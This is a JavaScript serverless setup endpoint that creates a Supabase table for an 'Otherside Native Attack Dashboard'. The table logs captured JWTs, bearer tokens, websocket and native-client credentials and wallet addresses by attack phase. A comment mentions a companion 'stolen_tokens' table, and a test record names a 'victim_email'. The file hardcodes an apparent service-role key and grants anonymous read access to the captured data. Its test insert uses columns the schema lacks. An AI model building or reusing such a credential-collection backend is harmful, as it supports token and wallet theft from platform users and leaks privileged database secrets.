import { createClient } from '@supabase/supabase-js';

// ============================================================
// Supabase Configuration
// ============================================================
const SUPABASE_URL = 'https://anruszfozkhgddzpcpft.supabase.co';
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY ||
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFucnVzemZvemtoZ2RkenBjcGZ0Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NzkyMTY3NywiZXhwIjoyMDkzNDk3Njc3fQ.lE3i-A82CpC4f0vTtUC8KvR2SPIepwFmFubLB4d2eaU';

// ============================================================
// SQL Migration for otherside_attack_logs table
// ============================================================
const MIGRATION_SQL = `
-- ============================================================
-- Table: otherside_attack_logs
-- All columns use os_ prefix (separate from stolen_tokens table)
-- This table stores data from the Otherside Native Attack Dashboard
-- ============================================================
CREATE TABLE IF NOT EXISTS otherside_attack_logs (
    id BIGSERIAL PRIMARY KEY,
    os_capture_timestamp TIMESTAMPTZ DEFAULT NOW(),

    -- Attack metadata
    os_attack_phase TEXT NOT NULL DEFAULT 'unknown',
    os_vuln_severity TEXT DEFAULT 'info',
    os_research_notes TEXT,
    os_source_domain TEXT,
    os_operator_agent TEXT,
    os_operator_screen TEXT,
    os_operator_language TEXT,
    os_operator_timezone TEXT,
    os_operator_referrer TEXT,

    -- Phase 1: Glyph Auth
    os_glyph_client_id TEXT,
    os_glyph_redirect_target TEXT,
    os_oidc_discovery_data JSONB,
    os_oidc_jwt_raw TEXT,
    os_oidc_token_claims JSONB,
    os_oidc_token_issuer TEXT,
    os_oidc_token_expiry TIMESTAMPTZ,
    os_exchange_response JSONB,
    os_fb_bridge_response JSONB,
    os_wallet_addr TEXT,
    os_siwe_message_content TEXT,

    -- Phase 2: Agentic API
    os_bearer_token TEXT,
    os_api_route TEXT,
    os_request_method TEXT,
    os_request_payload JSONB,
    os_api_response JSONB,
    os_http_status INTEGER,
    os_endpoint_map JSONB,

    -- Phase 3: Morpheus Network
    os_ws_endpoint TEXT,
    os_ws_auth_credential TEXT,
    os_infra_probe_result JSONB,
    os_captured_packet JSONB,

    -- Phase 4: Native Client
    os_native_credential TEXT,
    os_client_api_map JSONB,

    -- Phase 5: Pixel Streaming
    os_streaming_infra JSONB
);

-- Enable Row Level Security
ALTER TABLE otherside_attack_logs ENABLE ROW LEVEL SECURITY;

-- Policy: Allow anonymous inserts (for dashboard client-side saves)
CREATE POLICY "Allow anonymous inserts on otherside_attack_logs" ON otherside_attack_logs
    FOR INSERT
    TO anon
    WITH CHECK (true);

-- Policy: Allow anonymous reads (for dashboard results display)
CREATE POLICY "Allow anonymous reads on otherside_attack_logs" ON otherside_attack_logs
    FOR SELECT
    TO anon
    USING (true);

-- Policy: Allow service role full access
CREATE POLICY "Allow service role full access on otherside_attack_logs" ON otherside_attack_logs
    FOR ALL
    TO service_role
    USING (true)
    WITH CHECK (true);

-- Index for fast lookups by attack phase
CREATE INDEX IF NOT EXISTS idx_os_attack_phase ON otherside_attack_logs(os_attack_phase);

-- Index for fast lookups by timestamp
CREATE INDEX IF NOT EXISTS idx_os_capture_timestamp ON otherside_attack_logs(os_capture_timestamp DESC);

-- Index for fast lookups by severity
CREATE INDEX IF NOT EXISTS idx_os_vuln_severity ON otherside_attack_logs(os_vuln_severity);

-- Index for fast lookups by wallet address
CREATE INDEX IF NOT EXISTS idx_os_wallet_addr ON otherside_attack_logs(os_wallet_addr);

-- Index for fast lookups by API route
CREATE INDEX IF NOT EXISTS idx_os_api_route ON otherside_attack_logs(os_api_route);
`;

// ============================================================
// Helper: split SQL into individual statements
// ============================================================
function splitSqlStatements(sql) {
    return sql
        .split('\n')
        .filter(line => !line.trim().startsWith('--'))
        .join('\n')
        .split(';')
        .map(s => s.trim())
        .filter(s => s.length > 0);
}

// ============================================================
// Helper: execute SQL via direct PostgreSQL connection (if available)
// ============================================================
async function executeWithPg(sqlStatements) {
    // Dynamic import so it only fails if pg is not installed
    let pg;
    try {
        pg = await import('pg');
    } catch {
        return { success: false, method: null, error: 'pg module not available' };
    }

    const databaseUrl = process.env.DATABASE_URL;
    if (!databaseUrl) {
        return { success: false, method: 'pg', error: 'DATABASE_URL env var not set' };
    }

    const { Pool } = pg.default || pg;
    const pool = new Pool({ connectionString: databaseUrl, ssl: { rejectUnauthorized: false } });

    const results = [];
    try {
        for (const stmt of sqlStatements) {
            const result = await pool.query(stmt);
            results.push({ statement: stmt.substring(0, 80) + '...', success: true });
        }
        return { success: true, method: 'pg', results };
    } catch (error) {
        return { success: false, method: 'pg', error: error.message, partialResults: results };
    } finally {
        await pool.end();
    }
}

// ============================================================
// Helper: attempt setup via Supabase REST API
// Since the REST API cannot execute DDL, we check if the table
// already exists and test read/write. If not, we return the SQL.
// ============================================================
async function checkWithSupabaseClient() {
    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
        auth: { autoRefreshToken: false, persistSession: false }
    });

    const steps = [];
    let tableExists = false;

    // Step 1: Check if table exists by selecting from it
    try {
        const { data, error } = await supabase
            .from('otherside_attack_logs')
            .select('id')
            .limit(1);

        if (error) {
            if (error.message && (error.message.includes('does not exist') || error.message.includes('not found') || error.code === '42P01')) {
                steps.push({ step: 'check_table', status: 'table_not_found', message: error.message });
                tableExists = false;
            } else {
                // Some other error - might still not exist
                steps.push({ step: 'check_table', status: 'error', message: error.message, code: error.code });
                tableExists = false;
            }
        } else {
            steps.push({ step: 'check_table', status: 'table_exists', rowCount: data?.length || 0 });
            tableExists = true;
        }
    } catch (err) {
        steps.push({ step: 'check_table', status: 'exception', message: err.message });
        tableExists = false;
    }

    // Step 2: If table exists, test insert and read
    if (tableExists) {
        try {
            const testRecord = {
                attack_type: 'setup_test',
                victim_email: 'test@setup.local',
                notes: 'Automated setup verification record'
            };

            const { data: insertData, error: insertError } = await supabase
                .from('otherside_attack_logs')
                .insert([testRecord])
                .select();

            if (insertError) {
                steps.push({ step: 'test_insert', status: 'failed', message: insertError.message });
            } else {
                steps.push({ step: 'test_insert', status: 'success', insertedId: insertData?.[0]?.id });

                // Clean up test record
                if (insertData?.[0]?.id) {
                    const { error: deleteError } = await supabase
                        .from('otherside_attack_logs')
                        .delete()
                        .eq('id', insertData[0].id);

                    steps.push({
                        step: 'cleanup_test_record',
                        status: deleteError ? 'failed' : 'success',
                        message: deleteError?.message || 'Test record cleaned up'
                    });
                }
            }
        } catch (err) {
            steps.push({ step: 'test_insert', status: 'exception', message: err.message });
        }

        // Check table structure by reading column info (via a select with limit 0)
        try {
            const { data: schemaData, error: schemaError } = await supabase
                .from('otherside_attack_logs')
                .select('*')
                .limit(0);

            if (!schemaError) {
                steps.push({
                    step: 'verify_schema',
                    status: 'accessible',
                    message: 'Table is readable with service role key'
                });
            }
        } catch (err) {
            steps.push({ step: 'verify_schema', status: 'exception', message: err.message });
        }
    }

    return { tableExists, steps };
}

// ============================================================
// Main handler
// ============================================================
export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'GET' && req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed. Use GET or POST.' });
    }

    const result = {
        status: 'unknown',
        table: 'otherside_attack_logs',
        timestamp: new Date().toISOString(),
        steps: [],
        migrationSql: null,
        instructions: null
    };

    // --------------------------------------------------------
    // Strategy 1: Try direct PostgreSQL connection (if pg + DATABASE_URL available)
    // --------------------------------------------------------
    const statements = splitSqlStatements(MIGRATION_SQL);
    const pgResult = await executeWithPg(statements);

    if (pgResult.success) {
        result.status = 'success';
        result.steps.push({
            strategy: 'direct_postgresql',
            status: 'success',
            message: 'Table created/verified via direct PostgreSQL connection',
            details: pgResult.results
        });

        // Verify with Supabase client
        const clientCheck = await checkWithSupabaseClient();
        result.steps.push(...clientCheck.steps.map(s => ({ ...s, verifiedBy: 'supabase_client' })));

        return res.status(200).json(result);
    }

    // --------------------------------------------------------
    // Strategy 2: Check if table already exists via Supabase REST API
    // --------------------------------------------------------
    result.steps.push({
        strategy: 'direct_postgresql',
        status: 'unavailable',
        message: pgResult.error || 'pg module or DATABASE_URL not configured'
    });

    const clientResult = await checkWithSupabaseClient();
    result.steps.push(...clientResult.steps);

    if (clientResult.tableExists) {
        result.status = 'success';
        result.steps.push({
            step: 'final_status',
            status: 'table_exists_and_accessible',
            message: 'The otherside_attack_logs table exists and is accessible with the service role key.'
        });
        return res.status(200).json(result);
    }

    // --------------------------------------------------------
    // Table does not exist — return SQL + instructions
    // --------------------------------------------------------
    result.status = 'action_required';
    result.migrationSql = MIGRATION_SQL.trim();
    result.instructions = {
        title: 'Table does not exist. Run the SQL migration manually:',
        steps: [
            '1. Go to your Supabase Dashboard: https://supabase.com/dashboard/project/anruszfozkhgddzpcpft',
            '2. Navigate to SQL Editor in the left sidebar',
            '3. Paste the migrationSql from this response into the editor',
            '4. Click "Run" to execute the migration',
            '5. Re-call this endpoint to verify the setup',
        ],
        alternative: 'Or set the DATABASE_URL environment variable to enable automatic table creation via direct PostgreSQL connection.',
        endpoint_to_recheck: `${req.headers.host || 'localhost'}/api/setup-db`
    };

    return res.status(200).json(result);
}
